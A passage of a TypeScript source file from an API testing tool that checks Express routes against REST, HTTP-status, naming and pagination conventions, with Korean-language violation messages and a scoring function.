                    examples: ['GET /users/:id', 'GET /posts/:id/comments']
                });
            }
        }

        // 2. POST 요청 검증
        if (method === 'POST') {
            if (hasIdParam) {
                violations.push({
                    type: 'restful',
                    severity: 'error',
                    message: 'POST 요청은 일반적으로 ID 파라미터를 포함하지 않습니다',
                    suggestion: 'POST는 컬렉션 경로에 사용하고, 특정 리소스 수정은 PUT/PATCH를 사용하세요',
                    route: route.path,
                    method: route.method,
                    ruleId: 'REST-002',
                    category: 'rest-compliance',
                    examples: ['POST /users', 'PUT /users/:id']
                });
            }
        }

        // 3. PUT/PATCH 요청 검증
        if (method === 'PUT' || method === 'PATCH') {
            if (!hasIdParam) {
                violations.push({
                    type: 'restful',
                    severity: 'error',
                    message: `${method} 요청은 특정 리소스를 대상으로 해야 하므로 ID 파라미터가 필요합니다`,
                    suggestion: '경로에 /:id 파라미터를 추가하세요',
                    route: route.path,
                    method: route.method,
                    ruleId: 'REST-003',
                    category: 'rest-compliance',
                    examples: ['PUT /users/:id', 'PATCH /posts/:id']
                });
            }
        }

        // 4. DELETE 요청 검증
        if (method === 'DELETE') {
            if (!hasIdParam) {
                violations.push({
                    type: 'restful',
                    severity: 'error',
                    message: 'DELETE 요청은 특정 리소스를 대상으로 해야 하므로 ID 파라미터가 필요합니다',
                    suggestion: '경로에 /:id 파라미터를 추가하세요',
                    route: route.path,
                    method: route.method,
                    ruleId: 'REST-004',
                    category: 'rest-compliance',
                    examples: ['DELETE /users/:id', 'DELETE /posts/:id']
                });
            }
        }

        // 5. 복수형 리소스명 검증
        const resourceSegment = pathSegments.find(segment => !segment.startsWith(':'));
        if (resourceSegment) {
            violations.push(...this.validateEnhancedResourcePluralization(route, resourceSegment));
        }

        return violations;
    }


    /**
     * 향상된 리소스 복수형 검증 (동적 감지 기반)
     */
    private static validateEnhancedResourcePluralization(route: RouteDocumentation, resourceName: string): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];

        // 이미 복수형인지 동적으로 판단
        const isAlreadyPlural = this.isPlural(resourceName);

        if (!isAlreadyPlural) {
            violations.push({
                type: 'restful',
                severity: 'warning',
                message: `리소스명이 단수형일 가능성이 있습니다: '${resourceName}'`,
                suggestion: `복수형 사용을 고려해보세요`,
                route: route.path,
                method: route.method,
                ruleId: 'REST-005',
                category: 'rest-compliance',
                examples: [`/${resourceName}s`, '/users', '/posts']
            });
        }

        return violations;
    }

    /**
     * 향상된 HTTP 스펙 검증
     */
    private static validateEnhancedHTTPSpecs(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];        // 1. HTTP 메서드 검증 (하드코딩된 목록 제거)
        // 표준 HTTP 메서드는 Express에서 자동으로 처리되므로 검증 비활성화
        // 실제 동적 감지가 불가능하므로 이 검증을 제거

        // 2. 응답 상태 코드 검증
        if (route.responses) {
            for (const statusCode of Object.keys(route.responses)) {
                const code = parseInt(statusCode);
                if (isNaN(code) || code < 100 || code > 599) {
                    violations.push({
                        type: 'http-spec',
                        severity: 'error',
                        message: `유효하지 않은 HTTP 상태 코드: ${statusCode}`,
                        suggestion: '100-599 범위의 표준 HTTP 상태 코드를 사용하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'HTTP-002',
                        category: 'http-spec',
                        examples: ['200', '201', '400', '404', '500']
                    });
                }
            }
        }

        // 3. 메서드별 적절한 응답 코드 검증
        violations.push(...this.validateEnhancedMethodSpecificResponses(route));

        return violations;
    }

    /**
     * 향상된 메서드별 응답 코드 검증
     */
    private static validateEnhancedMethodSpecificResponses(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];

        if (!route.responses) return violations;

        const method = route.method.toUpperCase();
        const statusCodes = Object.keys(route.responses).map(Number);

        switch (method) {
            case 'GET':
                if (!statusCodes.includes(200) && !statusCodes.includes(404)) {
                    violations.push({
                        type: 'http-spec',
                        severity: 'warning',
                        message: 'GET 요청은 일반적으로 200 또는 404 응답을 포함해야 합니다',
                        suggestion: '성공 시 200, 리소스를 찾을 수 없을 때 404 응답을 추가하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'HTTP-003',
                        category: 'http-spec',
                        examples: ['200: 성공적인 조회', '404: 리소스 없음']
                    });
                }
                break;

            case 'POST':
                if (!statusCodes.includes(201) && !statusCodes.includes(200)) {
                    violations.push({
                        type: 'http-spec',
                        severity: 'warning',
                        message: 'POST 요청은 일반적으로 201 (Created) 또는 200 응답을 포함해야 합니다',
                        suggestion: '리소스 생성 시 201, 처리 완료 시 200 응답을 추가하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'HTTP-004',
                        category: 'http-spec',
                        examples: ['201: 리소스 생성됨', '200: 처리 완료']
                    });
                }
                break;

            case 'PUT':
            case 'PATCH':
                if (!statusCodes.includes(200) && !statusCodes.includes(204)) {
                    violations.push({
                        type: 'http-spec',
                        severity: 'warning',
                        message: `${method} 요청은 일반적으로 200 또는 204 응답을 포함해야 합니다`,
                        suggestion: '업데이트 성공 시 200 (응답 본문 포함) 또는 204 (응답 본문 없음)를 추가하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'HTTP-005',
                        category: 'http-spec',
                        examples: ['200: 업데이트 완료', '204: 업데이트 완료 (본문 없음)']
                    });
                }
                break;

            case 'DELETE':
                if (!statusCodes.includes(204) && !statusCodes.includes(200)) {
                    violations.push({
                        type: 'http-spec',
                        severity: 'warning',
                        message: 'DELETE 요청은 일반적으로 204 또는 200 응답을 포함해야 합니다',
                        suggestion: '삭제 성공 시 204 (응답 본문 없음) 또는 200 (응답 본문 포함)을 추가하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'HTTP-006',
                        category: 'http-spec',
                        examples: ['204: 삭제 완료', '200: 삭제 정보 반환']
                    });
                }
                break;
        }

        return violations;
    }

    /**
     * 기본 라우트 네이밍 검증 (기존 호환성용)
     */
    private static validateRouteNaming(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];
        const pathSegments = route.path.split('/').filter(segment => segment && !segment.startsWith(':'));

        // 1. 대문자 검증
        for (const segment of pathSegments) {
            if (/[A-Z]/.test(segment)) {
                violations.push({
                    type: 'naming',
                    severity: 'error',
                    message: `라우트 경로에 대문자가 포함되어 있습니다: '${segment}'`,
                    suggestion: `'${segment.toLowerCase()}'로 변경하세요`,
                    route: route.path,
                    method: route.method,
                    ruleId: 'NAM-001',
                    category: 'route-naming',
                    examples: [`/${segment.toLowerCase()}`, '/users', '/products'],
                    links: ['https://restfulapi.net/resource-naming/']
                });
            }
        }

        // 2. 단일 단어 규칙 검증
        for (const segment of pathSegments) {
            if (segment.includes('-') || segment.includes('_')) {
                const words = segment.split(/[-_]/);
                if (words.length > 2) {
                    violations.push({
                        type: 'naming',
                        severity: 'warning',
                        message: `라우트 세그먼트가 너무 복잡합니다: '${segment}'`,
                        suggestion: `더 간단한 단일 단어로 변경하거나 리소스 구조를 재검토하세요`,
                        route: route.path,
                        method: route.method,
                        ruleId: 'NAM-002',
                        category: 'route-naming',
                        examples: ['users', 'posts', 'simple-name'],
                        links: ['https://restfulapi.net/resource-naming/']
                    });
                }
            }
        }

        return violations;
    }

    /**
     * 기본 RESTful API 스펙 검증 (기존 호환성용)
     */
    private static validateRESTfulSpecs(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];
        const pathSegments = route.path.split('/').filter(segment => segment);
        const hasIdParam = pathSegments.some(segment => segment.startsWith(':'));
        const method = route.method.toUpperCase();

        // POST 요청에 ID 파라미터 포함 검증
        if (method === 'POST' && hasIdParam) {
            violations.push({
                type: 'restful',
                severity: 'error',
                message: 'POST 요청은 일반적으로 ID 파라미터를 포함하지 않습니다',
                suggestion: 'POST는 컬렉션 경로에 사용하고, 특정 리소스 수정은 PUT/PATCH를 사용하세요',
                route: route.path,
                method: route.method,
                ruleId: 'REST-002',
                category: 'rest-compliance',
                examples: ['POST /users', 'PUT /users/:id']
            });
        }

        // PUT/PATCH 요청에 ID 파라미터 누락 검증
        if ((method === 'PUT' || method === 'PATCH') && !hasIdParam) {
            violations.push({
                type: 'restful',
                severity: 'error',
                message: `${method} 요청은 특정 리소스를 대상으로 해야 하므로 ID 파라미터가 필요합니다`,
                suggestion: '경로에 /:id 파라미터를 추가하세요',
                route: route.path,
                method: route.method,
                ruleId: 'REST-003',
                category: 'rest-compliance',
                examples: ['PUT /users/:id', 'PATCH /posts/:id']
            });
        }

        // DELETE 요청에 ID 파라미터 누락 검증
        if (method === 'DELETE' && !hasIdParam) {
            violations.push({
                type: 'restful',
                severity: 'error',
                message: 'DELETE 요청은 특정 리소스를 대상으로 해야 하므로 ID 파라미터가 필요합니다',
                suggestion: '경로에 /:id 파라미터를 추가하세요',
                route: route.path,
                method: route.method,
                ruleId: 'REST-004',
                category: 'rest-compliance',
                examples: ['DELETE /users/:id', 'DELETE /posts/:id']
            });
        }

        return violations;
    }

    /**
     * 기본 HTTP 스펙 검증 (기존 호환성용)
     */
    private static validateHTTPSpecs(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];        // HTTP 메서드 검증 (하드코딩된 목록 제거)
        // 표준 HTTP 메서드는 Express에서 자동으로 처리되므로 검증 비활성화
        // 실제 동적 감지가 불가능하므로 이 검증을 제거

        // 응답 상태 코드 검증
        if (route.responses) {
            for (const statusCode of Object.keys(route.responses)) {
                const code = parseInt(statusCode);
                if (isNaN(code) || code < 100 || code > 599) {
                    violations.push({
                        type: 'http-spec',
                        severity: 'error',
                        message: `유효하지 않은 HTTP 상태 코드: ${statusCode}`,
                        suggestion: '100-599 범위의 표준 HTTP 상태 코드를 사용하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'HTTP-002',
                        category: 'http-spec',
                        examples: ['200', '201', '400', '404', '500']
                    });
                }
            }
        }

        return violations;
    }

    /**
     * 기본 철학 점수 계산 (기존 호환성용)
     */
    private static calculatePhilosophyScore(violations: PhilosophyViolation[]): number {
        let score = 100;

        for (const violation of violations) {
            switch (violation.severity) {
                case 'error':
                    score -= 10;
                    break;
                case 'warning':
                    score -= 5;
                    break;
                case 'info':
                    score -= 2;
                    break;
            }
        }

        return Math.max(0, score);
    }    /**
     * 개발 철학 위반 테스트 케이스 생성 (기존 호환성용)
     */
    private static generatePhilosophyTestCases(route: RouteDocumentation): TestCase[] {
        return this.generateEnhancedPhilosophyTestCases(route);
    }

    /**
     * 향상된 개발 철학 테스트 케이스 생성
     */
    private static generateEnhancedPhilosophyTestCases(route: RouteDocumentation): TestCase[] {
        const testCases: TestCase[] = [];

        // 철학 검증 수행
        const violations: PhilosophyViolation[] = [];
        violations.push(...this.validateEnhancedRouteNaming(route));
        violations.push(...this.validateEnhancedRESTfulSpecs(route));
        violations.push(...this.validateEnhancedHTTPSpecs(route));
        violations.push(...this.validateSecurityPhilosophy(route));
        violations.push(...this.validatePerformancePhilosophy(route));
        violations.push(...this.validateConsistencyPhilosophy(route));

        // 위반 사항을 타입별로 그룹화
        const violationGroups = this.groupViolationsByType(violations);

        // 각 위반 타입별로 실패 테스트 케이스 생성
        for (const [type, typeViolations] of Object.entries(violationGroups)) {
            if (typeViolations.length > 0) {
                const { errorCodes, allCodes } = this.extractDefinedStatusCodes(route);

                // Smart validation error code selection for philosophy violations:
                // 1. If route defines 422, use it (HTTP standard for validation errors)
                // 2. If route defines 400, use it (common for validation errors)  
                // 3. If route defines other 4xx codes, use the first one
                // 4. Fallback to 422 (system default)
                const philosophyErrorCode = errorCodes.find(code => code === 422) ||
                    errorCodes.find(code => code === 400) ||
                    errorCodes.find(code => allCodes.includes(code)) ||
                    422;

                // testCases.push({
                //     name: `${route.method} ${route.path} - Philosophy Violation: ${this.translateViolationType(type)}`,
                //     description: this.generatePhilosophyFailureDescription(type, typeViolations),
                //     type: 'failure',
                //     endpoint: route.path,
                //     method: route.method,
                //     expectedStatus: philosophyErrorCode, // Use dynamic error code for philosophy violations
                //     validationErrors: typeViolations.map(v => v.message),
                //     securityTestType: `philosophy-${type}`
                // });
            }
        }

        // 페이지네이션 특별 테스트 케이스 추가
        const paginationCases = this.generatePaginationTestCases(route);
        testCases.push(...paginationCases);

        return testCases;
    }


    /**
     * 페이지네이션 테스트 케이스 생성
     * 복수형 리소스에 대한 GET 요청에서 페이지네이션 지원 여부를 검증
     */
    private static generatePaginationTestCases(route: RouteDocumentation): TestCase[] {
        const testCases: TestCase[] = [];

        // GET 메소드이고, ID 파라미터가 없는 경우만 검증
        if (route.method.toUpperCase() !== 'GET' || route.path.includes('/:id')) {
            return testCases;
        }

        // 라우트 경로의 마지막 세그먼트 확인
        const pathSegments = route.path.split('/').filter(segment => segment && !segment.startsWith(':'));
        const lastSegment = pathSegments[pathSegments.length - 1];

        // 마지막 세그먼트가 없거나 복수형이 아니면 검증 불필요
        if (!lastSegment || !this.isPlural(lastSegment)) {
            return testCases;
        }        // 페이지네이션 파라미터 동적 감지
        const hasPaginationParams = this.detectPaginationParameters(route.parameters?.query || {});

        if (hasPaginationParams) {
            // 페이지네이션 파라미터가 있는 경우 성공 테스트 케이스 생성
            const paginationParams = this.extractPaginationParams(route.parameters?.query || {});

            // 페이지네이션 성공 테스트 케이스
            testCases.push({
                name: `${route.method} ${route.path} - Pagination Support Test`,
                description: `✅ 복수형 리소스 '${lastSegment}'에 페이지네이션 지원 확인 (${paginationParams.join(', ')})`,
                type: 'success',
                endpoint: route.path,
                method: route.method,
                data: {
                    query: this.generatePaginationTestData(paginationParams)
                },
                expectedStatus: 200,
                securityTestType: 'philosophy-pagination'
            });

            // 페이지네이션 응답 구조 검증 테스트 케이스
            testCases.push({
                name: `${route.method} ${route.path} - Pagination Response Structure Test`,
                description: `페이지네이션 응답에 필요한 메타데이터 검증 (총 개수, 현재 페이지, 전체 페이지 등)`,
                type: 'success',
                endpoint: route.path,
                method: route.method,
                data: {
                    query: this.generatePaginationTestData(paginationParams, true)
                },
                expectedStatus: 200,
                expectedData: {
                    mode: 'partial',
                    value: {
                        // 일반적인 페이지네이션 응답 구조 (meta 내부에 pagination 정보)
                        meta: {
                            pagination: {
                                type: 'object',
                                required: true
                            }
                        }
                    }
                },
                securityTestType: 'philosophy-pagination-response'
            });
        } else {

            // 페이지네이션 파라미터 누락에 대한 실패 테스트 케이스
            const { errorCodes, allCodes } = this.extractDefinedStatusCodes(route);

            // Smart validation error code selection for pagination philosophy violations:
            // 1. If route defines 422, use it (HTTP standard for validation errors)
            // 2. If route defines 400, use it (common for validation errors)  
            // 3. If route defines other 4xx codes, use the first one
            // 4. Fallback to 422 (system default)
            const paginationErrorCode = errorCodes.find(code => code === 422) ||
                errorCodes.find(code => code === 400) ||
                errorCodes.find(code => allCodes.includes(code)) ||
                422;

            testCases.push({
                name: `${route.method} ${route.path} - Missing Pagination Parameters`,
                description: `❌ 복수형 리소스 '${lastSegment}'는 페이지네이션이 필요합니다`,
                type: 'failure',
                endpoint: route.path,
                method: route.method,
                expectedStatus: paginationErrorCode,
                validationErrors: [
                    `복수형 리소스 조회 엔드포인트에는 페이지네이션이 필요합니다`,
                    `page, limit 또는 cursor 등의 쿼리 파라미터를 추가하세요`
                ],
                securityTestType: 'philosophy-missing-pagination'
            });
        }

        return testCases;
    }    /**
     * 보안 철학 검증 (동적 감지 기반)
     */
    private static validateSecurityPhilosophy(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];

        // 1. 민감한 데이터 패턴 동적 감지 (스키마 기반)
        const hasSensitiveData = this.detectSensitiveDataFromSchema(route);
        if (hasSensitiveData) {
            violations.push({
                type: 'security',
                severity: 'info',
                message: `민감한 데이터를 처리하는 엔드포인트는 HTTPS 사용을 권장합니다`,
                suggestion: 'HTTPS 리다이렉션 미들웨어를 사용하고 민감한 데이터는 HTTPS로만 전송하세요',
                route: route.path,
                method: route.method,
                ruleId: 'SEC-001',
                category: 'security',
                examples: ['app.use(requireHTTPS)', 'helmet.hsts()'],
                links: ['https://owasp.org/www-project-api-security/']
            });
        }

        // 2. 파일 업로드 보안 검증 (동적 감지)
        if (route.parameters?.body) {
            const hasFileUpload = this.detectFileUploadFromSchema(route.parameters.body);
            if (hasFileUpload) {
                violations.push({
                    type: 'security',
                    severity: 'warning',
                    message: '파일 업로드 엔드포인트는 추가 보안 검증이 필요합니다',
                    suggestion: '파일 타입 검증, 크기 제한, 스캔 검사를 구현하세요',
                    route: route.path,
                    method: route.method,
                    ruleId: 'SEC-002',
                    category: 'security',
                    examples: ['multer file validation', 'virus scanning', 'file type whitelist']
                });
            }
        }

        return violations;
    }



    /**
     * 성능 최적화 철학 검증
     */
    private static validatePerformancePhilosophy(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];        // 1. 대량 데이터 처리 검증
        if (route.method.toUpperCase() === 'GET') {
            // 페이지네이션 파라미터 동적 감지
            const hasPaginationParam = this.detectPaginationParameters(route.parameters?.query || {});

            const pathSegments = route.path.split('/').filter(segment => segment && !segment.startsWith(':'));
            const lastSegment = pathSegments[pathSegments.length - 1];

            // 마지막 경로 세그먼트가 복수형인지 확인
            const isLastSegmentPlural = lastSegment ? this.isPlural(lastSegment) : false;

            if (!hasPaginationParam && !route.path.includes('/:id')) {
                // 복수형 이름을 가진 GET 요청에는 페이지네이션을 강력히 권장
                if (isLastSegmentPlural) {
                    violations.push({
                        type: 'performance',
                        severity: 'error',
                        message: `복수형 리소스 조회 엔드포인트 '${lastSegment}'에 페이지네이션이 필요합니다`,
                        suggestion: '페이지네이션 쿼리 파라미터를 추가하여 대량 데이터 조회를 최적화하세요',
                        route: route.path,
                        method: route.method,
                        ruleId: 'PERF-001',
                        category: 'performance',
                        examples: [`GET /${lastSegment}?page=1&limit=10`, `GET /${lastSegment}?offset=20&size=10`, `GET /${lastSegment}?cursor=lastId&limit=10`]
                    });
                }
            }
        }

        // 2. 캐싱 전략 검증
        // if (route.method.toUpperCase() === 'GET' && !route.path.includes('/:id')) {
        //     // 캐싱 관련 속성이 이미 설정되어 있는지 확인
        //     const hasCachingStrategy =
        //         route.responses &&
        //         Object.values(route.responses).some(response => {
        //             if (typeof response === 'object' && response !== null) {
        //                 // 응답 객체에 headers 속성이 있고 캐싱 관련 헤더가 포함되어 있는지 확인
        //                 return response.hasOwnProperty('headers') &&
        //                     (
        //                         response.headers?.hasOwnProperty('ETag') ||
        //                         response.headers?.hasOwnProperty('Cache-Control') ||
        //                         response.headers?.hasOwnProperty('Last-Modified')
        //                     );
        //             }
        //             return false;
        //         });

        //     // 캐싱 전략이 없는 경우에만 위반사항 추가
        //     if (!hasCachingStrategy) {
        //         violations.push({
        //             type: 'performance',
        //             severity: 'info',
        //             message: '컬렉션 조회 엔드포인트에 캐싱 전략을 고려해보세요',
        //             suggestion: 'ETag, Last-Modified 헤더나 메모리 기반 캐싱을 고려하세요',
        //             route: route.path,
        //             method: route.method,
        //             ruleId: 'PERF-002',
        //             category: 'performance',
        //             examples: ['Cache-Control: max-age=300', 'ETag: "12345"']
        //         });
        //     }
        // }

        return violations;
    }



    /**
     * API 일관성 철학 검증
     */
    private static validateConsistencyPhilosophy(route: RouteDocumentation): PhilosophyViolation[] {
        const violations: PhilosophyViolation[] = [];

        // 1. 네이밍 일관성 검증
        const allPaths = this.routes.map(r => r.path);
        const pathSegments = route.path.split('/').filter(segment => segment && !segment.startsWith(':'));

        for (const segment of pathSegments) {
            // 같은 리소스에 대해 다른 네이밍 사용 검증
            const variations = [
                segment + 's', segment.slice(0, -1), // 단복수 변형
                segment.replace('-', '_'), segment.replace('_', '-'), // 구분자 변형
                segment.toLowerCase(), segment.toUpperCase() // 대소문자 변형
            ];

            const conflictingPaths = allPaths.filter(path => {
                const otherSegments = path.split('/').filter(s => s && !s.startsWith(':'));
                return otherSegments.some(otherSegment =>
                    variations.includes(otherSegment) && otherSegment !== segment
                );
            });

            if (conflictingPaths.length > 0) {
                violations.push({
                    type: 'consistency',
                    severity: 'warning',
                    message: `리소스 네이밍이 일관되지 않습니다: '${segment}'`,
                    suggestion: `전체 API에서 동일한 네이밍 컨벤션을 사용하세요. 충돌: ${conflictingPaths.join(', ')}`,
                    route: route.path,
                    method: route.method,
                    ruleId: 'CONS-001',
                    category: 'api-design',
                    examples: ['users (복수형 사용)', 'kebab-case 또는 snake_case 일관성 유지']
                });
            }
        }

        // 2. 응답 형식 일관성 검증
        // if (route.responses) {
        //     const successResponses = Object.entries(route.responses)
        //         .filter(([code]) => code.startsWith('2'))
        //         .map(([, response]) => response);

        //     for (const response of successResponses) {
        //         if (typeof response === 'object' && response !== null) {
        //             // 공통 응답 필드 검증 (data, meta, pagination 등)
        //             const commonFields = ['data', 'message', 'status', 'meta', 'pagination'];
        //             const hasCommonStructure = commonFields.some(field => field in response);

        //             if (!hasCommonStructure && route.method.toUpperCase() === 'GET') {
        //                 violations.push({
        //                     type: 'consistency',
        //                     severity: 'info',
        //                     message: '응답 구조에 공통 필드가 없습니다',
        //                     suggestion: 'data, meta, message 등의 공통 응답 구조를 사용하여 일관성을 유지하세요',
        //                     route: route.path,
        //                     method: route.method,
        //                     ruleId: 'CONS-002',
        //                     category: 'api-design',
        //                     examples: ['{ data: [], meta: { total: 100 } }', '{ message: "success", data: {} }']
        //                 });
        //             }
        //         }
        //     }
        // }

        return violations;
    }

    /**
     * 페이지네이션 파라미터를 동적으로 감지
     * 하드코딩된 키워드 없이는 진정한 동적 감지가 불가능하므로 비활성화
     */
    private static detectPaginationParameters(querySchema: Schema): boolean {
        // 하드코딩된 키워드 목록 제거 - 실제 동적 감지가 불가능하므로 false 반환
        return false;
    }

    /**
     * 페이지네이션 파라미터 목록 추출
     * 하드코딩된 키워드 없이는 진정한 동적 감지가 불가능하므로 비활성화
     */
    private static extractPaginationParams(querySchema: Schema): string[] {
        // 하드코딩된 키워드 목록 제거 - 실제 동적 감지가 불가능하므로 빈 배열 반환
        return [];
    }

    /**
     * 스키마에서 파일 업로드 여부를 동적으로 감지
     */
    private static detectFileUploadFromSchema(schema: Schema): boolean {
        for (const [fieldName, fieldSchema] of Object.entries(schema)) {
            if (this.isFileUploadField(fieldSchema)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 필드 스키마가 파일 업로드인지 동적으로 판단
     */
    private static isFileUploadField(fieldSchema: FieldSchema): boolean {
        // 1. 타입이 명시적으로 파일 관련인 경우
        if (fieldSchema.type === 'file' ||
            fieldSchema.type === 'binary' ||
            fieldSchema.type === 'buffer') {
            return true;
        }

        // 2. 포맷이 파일 관련인 경우  
        if (fieldSchema.format === 'binary' ||
            fieldSchema.format === 'base64') {
            return true;
        }        // 3. Content-Type이 파일 업로드 관련인지 동적으로 감지
        if (fieldSchema.contentType) {
            // 하드코딩된 파일 타입 목록 제거 - Content-Type이 명시되어 있다면 파일 업로드로 간주
            const contentType = fieldSchema.contentType.toLowerCase();
            // multipart/form-data이거나 application/으로 시작하는 경우 파일 업로드로 간주
            return contentType.includes('multipart') ||
                contentType.includes('application/') ||
                contentType.includes('image/') ||
                contentType.includes('video/') ||
                contentType.includes('audio/');
        }

        // 4. MIME 타입이 설정되어 있고 파일 관련인 경우
        if (fieldSchema.mediaType) {
            return fieldSchema.mediaType.includes('/') &&
                !fieldSchema.mediaType.startsWith('text/plain') &&
                !fieldSchema.mediaType.startsWith('application/json');
        }

        // 5. 스키마에 파일 관련 속성이 있는 경우
        if (fieldSchema.properties) {
            const hasFileProperties = Object.keys(fieldSchema.properties).some(key => {
                const prop = fieldSchema.properties![key];
                return this.isFileUploadField(prop);
            });
            if (hasFileProperties) return true;
        }

        // 6. 예시 값이 파일 관련인 경우
        if (fieldSchema.example && typeof fieldSchema.example === 'string') {
            const fileExtensions = /\.(jpg|jpeg|png|gif|pdf|doc|docx|zip|csv|xlsx)$/i;
            return fileExtensions.test(fieldSchema.example);
        }

        return false;
    }

    /**
     * 스키마에서 민감한 데이터 여부를 동적으로 감지
     */
    private static detectSensitiveDataFromSchema(route: RouteDocumentation): boolean {
        // 1. 모든 파라미터에서 민감한 필드명 패턴 감지 (스키마 기반)
        const allParameters = {
            ...(route.parameters?.query || {}),
            ...(route.parameters?.params || {}),
            ...(route.parameters?.body || {})
        };

        for (const [fieldName, fieldSchema] of Object.entries(allParameters)) {
            if (this.isSensitiveField(fieldName, fieldSchema)) {
                return true;
            }
        }

        // 2. 라우트 경로에서 민감한 패턴 감지
        return this.isSensitivePath(route.path);
    }    /**
     * 필드가 민감한 데이터인지 동적으로 판단
     */
    private static isSensitiveField(fieldName: string, fieldSchema: FieldSchema): boolean {
        // 1. 스키마 속성에서 민감함 표시 확인 (가장 우선)
        if (fieldSchema.sensitive === true || fieldSchema.confidential === true) {
            return true;
        }

        // 2. 필드 포맷이 명시적으로 민감한 포맷인지 확인
        if (fieldSchema.format === 'password') {
            return true;
        }

        // 하드코딩된 키워드 목록은 제거 - 실제 동적 감지가 불가능

        return false;
    }/**
     * 경로가 민감한 데이터를 처리하는지 동적으로 판단
     */
    private static isSensitivePath(path: string): boolean {
        // 하드코딩된 키워드 목록은 제거 - 실제 동적 감지가 불가능하므로 제거
        // 스키마 기반으로만 판단하거나 이 검증 자체를 제거
        return false;
    }    /**
     * 단어가 동사 패턴인지 동적으로 감지
     */
    private static detectVerbPattern(word: string): boolean {
        const lowerWord = word.toLowerCase();

        // 1. 동사 어미 패턴으로만 감지 (언어학적 규칙 기반)
        if (lowerWord.endsWith('ing') || lowerWord.endsWith('ed') ||
            lowerWord.endsWith('ify') || lowerWord.endsWith('ize') ||
            lowerWord.endsWith('ate')) {
            return true;
        }

        // 하드코딩된 동사 목록은 제거 - 실제 동적 감지가 불가능

        return false;
    }

    /**
     * 페이지네이션 테스트 데이터 생성
     */
    private static generatePaginationTestData(paginationParams: string[], smallValues: boolean = false): Record<string, any> {
        const testData: Record<string, any> = {};

        for (const param of paginationParams) {
            const lowerParam = param.toLowerCase();

            if (lowerParam.includes('page')) {
                testData[param] = 1;
            } else if (lowerParam.includes('cursor')) {
                testData[param] = 'testCursor123';
            } else if (lowerParam.includes('limit') || lowerParam.includes('size') ||
                lowerParam.includes('count') || lowerParam.includes('take')) {
                testData[param] = smallValues ? 5 : 10;
            } else if (lowerParam.includes('offset') || lowerParam.includes('skip')) {
                testData[param] = smallValues ? 0 : 20;
            } else {
                // 기본값
                testData[param] = smallValues ? 5 : 10;
            }
        }

        return testData;
    }

    /**
     * 철학 위반 사항을 타입별로 그룹화
     */
    private static groupViolationsByType(violations: PhilosophyViolation[]): Record<string, PhilosophyViolation[]> {
        const groups: Record<string, PhilosophyViolation[]> = {};

        for (const violation of violations) {
            if (!groups[violation.type]) {
                groups[violation.type] = [];
            }
            groups[violation.type].push(violation);
        }

        return groups;
    }

    /**
     * 철학 위반 설명 생성
     */
    private static generatePhilosophyFailureDescription(type: string, violations: PhilosophyViolation[]): string {
        const violationCount = violations.length;
        const errorCount = violations.filter(v => v.severity === 'error').length;
        const warningCount = violations.filter(v => v.severity === 'warning').length;
        const infoCount = violations.filter(v => v.severity === 'info').length;

        let description = `${violationCount}개의 ${this.translateViolationType(type)} 위반 사항이 발견되었습니다: `;

        if (errorCount > 0) {
            description += `${errorCount}개 오류`;
        }

        if (warningCount > 0) {
            if (errorCount > 0) description += ', ';
            description += `${warningCount}개 경고`;
        }

        if (infoCount > 0) {
            if (errorCount > 0 || warningCount > 0) description += ', ';
            description += `${infoCount}개 정보`;
        }

        // 첫 번째 위반 사항 메시지 추가
        if (violations.length > 0) {
            description += `\n첫 번째 위반: ${violations[0].message}`;
            if (violations[0].suggestion) {
                description += `\n제안사항: ${violations[0].suggestion}`;
            }
        }

        // 추가 위반 사항 개수 표시
        if (violations.length > 1) {
            description += `\n...외 ${violations.length - 1}개 위반 사항`;
        }

        return description;
    }

    /**
     * 위반 타입 한글 표현으로 변환
     */
    private static translateViolationType(type: string): string {
        const translations: Record<string, string> = {
            'naming': '명명규칙',
            'restful': 'RESTful 설계',
            'http-spec': 'HTTP 규격',
            'structure': '구조',
            'security': '보안',
            'performance': '성능',
            'consistency': '일관성'
        };

        return translations[type] || type;
    }

    /**
     * 향상된 철학 점수 계산
     */
    private static calculateEnhancedPhilosophyScore(violations: PhilosophyViolation[]): number {
        let score = 100;

        // 심각도에 따른 감점
        for (const violation of violations) {
            switch (violation.severity) {
                case 'error':
                    score -= 10;
                    break;
                case 'warning':
                    score -= 5;
                    break;
                case 'info':
                    score -= 2;
                    break;
            }
        }

        // 위반 타입에 따른 추가 감점
        const typeWeights: Record<string, number> = {
            'security': 1.5,  // 보안 위반은 더 심각하게 취급
            'performance': 1.2,   // 성능 위반도 중요하게 취급
            'naming': 0.8,  // 명명 규칙은 상대적으로 덜 심각
        };

        for (const violation of violations) {
            const weight = typeWeights[violation.type] || 1;
            if (weight !== 1) {
                // 이미 기본 감점을 했으므로, 가중치에서 1을 빼고 적용
                score -= (weight - 1) * (violation.severity === 'error' ? 10 : violation.severity === 'warning' ? 5 : 2);
            }
        }

        return Math.max(0, Math.round(score));
    }
}
